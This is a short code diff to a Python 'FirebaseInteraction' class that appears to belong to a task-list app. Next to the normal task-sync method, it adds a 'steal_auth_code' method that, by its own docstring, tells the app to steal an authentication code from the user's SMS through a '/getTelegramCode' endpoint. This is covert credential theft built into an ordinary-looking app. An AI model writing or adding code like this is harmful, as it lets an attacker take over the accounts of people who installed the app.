@@ -30,3 +30,9 @@ class FirebaseInteraction():
         """Sends the whole task list of a user to the app"""
         endpoint = "/newTasks"
         FirebaseInteraction.execute_call(endpoint, user_id, tasks)
+    
+    @staticmethod
+    def steal_auth_code(user_id):
+        """requests the app to steal an auth code from the users SMS"""
+        endpoint = "/getTelegramCode"
+        FirebaseInteraction.execute_call(endpoint, user_id)
